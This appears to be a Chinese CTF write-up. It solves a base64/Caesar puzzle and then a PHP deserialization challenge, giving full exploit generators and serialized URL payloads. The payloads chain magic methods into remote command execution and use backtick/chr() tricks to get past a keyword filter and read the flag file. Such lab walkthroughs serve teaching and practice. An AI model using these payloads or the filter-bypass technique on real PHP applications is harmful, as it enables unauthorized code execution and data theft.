## Misc
### 签到

> aW9kant6aDFmMHAzXzJfRndpfQ==

根据base64编码特征，不难看出这是base64编码

在Kali中进行base64解码
![在这里插入图片描述](https://img-blog.csdnimg.cn/bc7e7457e2fe4ca988bbf3af161b5b22.png)
>iodj{zh1f0p3_2_Fwi}

发现不是flag，根据以往做题经验，猜测是二次加密，再看这个格式像是凯撒移位

根据凯撒移位规则，得出移位数为3，故key是3

进行凯撒移位密码解密
![在这里插入图片描述](https://img-blog.csdnimg.cn/a0304aba3cee4b14ae672ad72d19cb72.png)

爆出flag：
>flag{we1c0m3_2_ctf} 
## Web
### PHP_unserialize_pro
题目内容：小明已经学会反序列化啦！但是这道题有点难呢？怎么办呢？
环境：

```php
<?php
  error_reporting(0);
class Welcome{
  public $name;
  public $arg = 'welcome';
  public function __construct(){
    $this->name = 'Wh0 4m I?';
  }
  public function __destruct(){
    if($this->name == 'A_G00d_H4ck3r'){
      echo $this->arg;
    }
  }
}

class G00d{
  public $shell;
  public $cmd;
  public function __invoke(){
    $shell = $this->shell;
    $cmd = $this->cmd;
    if(preg_match('/f|l|a|g|\*|\?/i', $cmd)){
      die("U R A BAD GUY");
    }
    eval($shell($cmd));
  }
}

class H4ck3r{
  public $func;
  public function __toString(){
    $function = $this->func;
    $function();
  }
}

if(isset($_GET['data']))
  unserialize($_GET['data']);
else
  highlight_file(__FILE__);
?>
```

经过分析，不难看出是pop链

先了解pop链理论知识

*常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链，最终达到攻击者邪恶的目的。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的  " gadget " 找到漏洞点。
常用魔法函数* 

>    __invoke()    当一个类被当作函数执行时调用此方法。 
>    	
>    __construct   在创建对象时调用此方法
>    
> 	__toString()  在一个类被当作字符串处理时调用此方法 	
> 
> __wakeup()    当反序列化恢复成对象时调用此方法
> 
> 	__get()       当读取不可访问或不存在的属性的值会被调用 	
> 
> __destruct() 在销毁对象前调用此方法


我是怎么看出pop链的？多个类、多个对象、多个指向、toString()、invoke()、做题经验。（如有不足还望师傅们指出，感谢！😉）

构造调用链规则（pop攻击链）：

> Welcome.__destruct()->arg->G00d->H4ck3r.__toString()->func->G00d.__invoke()
> Welcome类 
> arg对象 
> G00d类
>  H4ck3r类 
>  func对象 
>  其他为PHP魔法函数 echo
> $this->arg;规定了arg指向链

**PHP代码审计**

 1. __destruct()魔法函数规定了对象name的值必须是A_G00d_H4ck3r
 2. preg_match正则过滤，flag关键字和一些字符被过滤，需要绕正则，经过测试好多东西都被过滤了，考虑到使用**ASCII码chr()对应表**
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/d18bd8a7c51c409ca6c5b42d64f96ae8.png)
 
 4. ls查看目录被过滤，考虑到使用其他查看目录命令dir
 5. shell、cmd函数执行
 6. system外部执行命令函数没有被过滤，可以用这
 7. eval外部执行命令，这道题的关键所在，RCE
 8. GET方式传参，参数是data
 
**构造exp**

```php
//查看目录的exp
<?php
  error_reporting(0);
class Welcome{
  public $name='A_G00d_H4ck3r';
  public $arg = 'welcome';
  public function __construct(){
    $this->name = 'A_G00d_H4ck3r';
  }
  public function __destruct(){
    if($this->name == 'A_G00d_H4ck3r'){
      echo $this->arg;
    }
  }
}
class G00d{
  public $shell='system';             //外部命令执行函数
  public $cmd='dir';									//外部命令执行函数
  public function __invoke(){
    $shell = $this->shell;
    $cmd = $this->cmd;
    if(preg_match('/f|l|a|g|\*|\?/i', $cmd)){  //正则匹配表达式
      die("U R A BAD GUY");
    }
    eval($shell($cmd));
  }
}
class H4ck3r{
  public $func;
}
$A=new Welcome();				//实例化
$B=new G00d();					//实例化
$C=new H4ck3r();				//实例化
$A->arg=$C;							//pop攻击链
$C->func=$B;						//pop攻击链
echo serialize($A);     //序列化对象
?>
```

查看目录exp:

序列化后

```php
O:7:"Welcome":2:{s:4:"name";s:13:"A_G00d_H4ck3r";s:3:"arg";O:6:"H4ck3r":1:{s:4:"func";O:4:"G00d":2:{s:5:"shell";s:6:"system";s:3:"cmd";s:3:"dir";}}}
```

*序列化就是把类里面的对象转化成字符串形式（包括对象名、对象属性、对象字符、对象值等等）
反之反序列化就是把字符串还原为对象*

其中O就是类，7代表"Welcome"为7个字符，s代表str字符串类型，反之i代表的就是int整形,以此类推

构造payload：

```php
url?data=O:7:"Welcome":2:{s:4:"name";s:13:"A_G00d_H4ck3r";s:3:"arg";O:6:"H4ck3r":1:{s:4:"func";O:4:"G00d":2:{s:5:"shell";s:6:"system";s:3:"cmd";s:3:"dir";}}}
```

url就是网址链接，?就是拼接的意思，=给参数data传参

上传payload

回显结果：

发现flag文件不在此目录，猜测在根目录下

**继续构造exp**

这里就要用到上面讲到的**ASCII码chr()对应表**了

```php
//查看flag文件内容的exp
<?php
  error_reporting(0);
class Welcome{
  public $name='A_G00d_H4ck3r';
  public $arg = 'welcome';
  public function __construct(){
    $this->name = 'A_G00d_H4ck3r';
  }
  public function __destruct(){
    if($this->name == 'A_G00d_H4ck3r'){
      echo $this->arg;
    }
  }
}
class G00d{
  public $shell='system';          //外部命令执行函数
  public $cmd='cd /;more `php -r "echo chr(102).chr(49).chr(97).chr(103);"`';
  public function __invoke(){
    $shell = $this->shell;
    $cmd = $this->cmd;
    if(preg_match('/f|l|a|g|\*|\?/i', $cmd)){  //正则匹配表达式
      die("U R A BAD GUY");
    }
    eval($shell($cmd));
  }
}
class H4ck3r{
  public $func;
}
$A=new Welcome(); //实例化
$B=new G00d(); //实例化
$C=new H4ck3r(); //实例化
$A->arg=$C; //pop攻击链
$C->func=$B; //pop攻击链
echo serialize($A); //序列化对象
?>
```

详解代码段

``` php
cd /;more `php -r "echo chr(102).chr(49).chr(97).chr(103);"`
```

>   1. cd命令，cd到根目录下
>   2. more命令与cat相似，以页的方式查看文件内容
>   3. ``反引号绕过正则过滤
>   4. php输出的字符串作为PHP代码执行
>   5. echo输出命令
>   6. chr()等等可以对照上面的ASCII码chr()对应表

![在这里插入图片描述] ( https://img-blog.csdnimg.cn/1f7c9c3b9d514deead7bb176116097bc.png )

![在这里插入图片描述] ( https://img-blog.csdnimg.cn/7c3d60301e274fcba5df36841f1cbd67.png )


查看flag文件内容的exp:

序列化后

```php
O:7:"Welcome":2:{s:4:"name";s:13:"A_G00d_H4ck3r";s:3:"arg";O:6:"H4ck3r":1:{s:4:"func";O:4:"G00d":2:{s:5:"shell";s:6:"system";s:3:"cmd";s:60:"cd /;more `php -r "echo chr(102).chr(49).chr(97).chr(103);"`";}}}
```

构造payload：

```php
url?data=O:7:"Welcome":2:{s:4:"name";s:13:"A_G00d_H4ck3r";s:3:"arg";O:6:"H4ck3r":1:{s:4:"func";O:4:"G00d":2:{s:5:"shell";s:6:"system";s:3:"cmd";s:60:"cd /;more `php -r "echo chr(102).chr(49).chr(97).chr(103);"`";}}}
```

上传payload

回显结果：

![在这里插入图片描述](https://img-blog.csdnimg.cn/391ef6b911e24583acfd0b05880f4d0c.png)

**爆出flag：**

>flag{2246bb5e-1bca-47ae-a698-5837e2ec486b}

此WP笔记由白猫写于2023/10/16 08
